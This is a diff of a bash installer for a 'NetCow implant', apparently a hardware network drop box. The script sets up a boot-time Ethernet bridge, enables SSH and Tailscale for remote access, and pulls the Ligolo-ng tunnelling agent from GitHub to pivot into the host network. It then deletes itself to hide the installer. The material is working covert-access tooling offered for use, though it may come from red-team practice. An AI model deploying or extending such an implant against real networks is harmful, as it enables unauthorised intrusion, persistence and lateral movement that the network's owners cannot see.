@@ -1,9 +1,11 @@
 #!/bin/bash
+
 set -e
+
 echo "[+] Deploying NetCow implant..."
 
 # 1. Install required packages
-REQUIRED_PKGS=(bridge-utils ifupdown isc-dhcp-client tailscale curl tar)
+REQUIRED_PKGS=(bridge-utils ifupdown isc-dhcp-client tailscale curl tar openssh-server)
 for pkg in "${REQUIRED_PKGS[@]}"; do
     if ! dpkg -s "$pkg" >/dev/null 2>&1; then
         echo "    [-] $pkg missing, installing..."
@@ -13,14 +15,20 @@ for pkg in "${REQUIRED_PKGS[@]}"; do
     fi
 done
 
-# 2. Set wlan0 metric to 100 in /etc/network/interfaces
+# 2. Enable SSH service
+echo "[+] Enabling SSH service..."
+systemctl enable ssh
+systemctl start ssh
+echo "[✓] SSH is now active."
+
+# 3. Set wlan0 metric to 100 in /etc/network/interfaces
 if grep -q "iface wlan0" /etc/network/interfaces; then
     sed -i '/iface wlan0 inet dhcp/!b;n;c\    metric 100' /etc/network/interfaces
 else
     echo -e "\nauto wlan0\niface wlan0 inet dhcp\n    metric 100" >> /etc/network/interfaces
 fi
 
-# 3. Create /usr/local/sbin/setup_bridge.sh
+# 4. Create /usr/local/sbin/setup_bridge.sh
 cat << 'EOF' > /usr/local/sbin/setup_bridge.sh
 #!/bin/bash
 
@@ -64,7 +72,7 @@ EOF
 chmod +x /usr/local/sbin/setup_bridge.sh
 echo "[+] setup_bridge.sh created."
 
-# 4. Create systemd service for setup_bridge
+# 5. Create systemd service for setup_bridge
 cat << 'EOF' > /etc/systemd/system/setup-bridge.service
 [Unit]
 Description=Setup bridge br0 at boot
@@ -82,7 +90,7 @@ EOF
 
 echo "[+] Systemd service setup-bridge.service created."
 
-# 5. Configure NetworkManager to ignore eth0/eth1
+# 6. Configure NetworkManager to ignore eth0/eth1
 NM_CONF="/etc/NetworkManager/NetworkManager.conf"
 echo "[+] Configuring NetworkManager to ignore eth0/eth1..."
 if ! grep -q "\[keyfile\]" "$NM_CONF"; then
@@ -95,32 +103,38 @@ else
 fi
 
 systemctl restart NetworkManager
-echo "[+] NetworkManager restarted."
+echo "[✓] NetworkManager restarted."
 
-# 6. Enable bridge service at boot
+# 7. Enable bridge service at boot
 systemctl daemon-reexec
 systemctl enable setup-bridge.service
-echo "[+] setup-bridge.service enabled."
 
-# 7. Enable and start Tailscale
-echo "[+] Enabling and starting Tailscale..."
+# 8. Enable and start Tailscale
 systemctl enable tailscaled
 systemctl start tailscaled
-echo "[+] Tailscale daemon is running."
+echo "[✓] Tailscale ready to use."
 
-# 8. Download and extract Ligolo-ng agent
+# 9. Download and extract Ligolo-ng agent
 echo "[+] Downloading Ligolo-ng agent..."
 mkdir -p /opt/ligolo
 curl -sSL https://github.com/nicocha30/ligolo-ng/releases/download/v0.8/ligolo-ng_agent_0.8_linux_arm64.tar.gz -o /opt/ligolo/ligolo-agent.tar.gz
 tar -xvzf /opt/ligolo/ligolo-agent.tar.gz -C /opt/ligolo/
 rm -f /opt/ligolo/LICENSE /opt/ligolo/README.md /opt/ligolo/ligolo-agent.tar.gz
 chmod +x /opt/ligolo/agent
-echo "[+] Ligolo-ng agent ready at /opt/ligolo/agent"
 
-# 9. Self-delete installer
+# Create global alias for Ligolo agent
+ln -sf /opt/ligolo/agent /usr/local/bin/ligolo
+echo "[✓] Ligolo-ng agent ready to use as 'ligolo'"
+
+# 10. Self-delete installer
 INSTALLER_PATH=$(readlink -f "$0")
 echo "[+] Deleting installer script: $INSTALLER_PATH"
 rm -f "$INSTALLER_PATH"
 
-echo "[✓] Installation complete."
-echo "[✓] ToDo 'sudo reboot'"
+# Final messages
+echo
+echo "[✓] NetCowImplant - Installation complete!"
+echo "[!] To finish setup:"
+echo "    1. Run: sudo tailscale up --authkey tskey-xxxxxxxxxxxxxxxx"
+echo "    2. Reboot: sudo reboot"
+echo
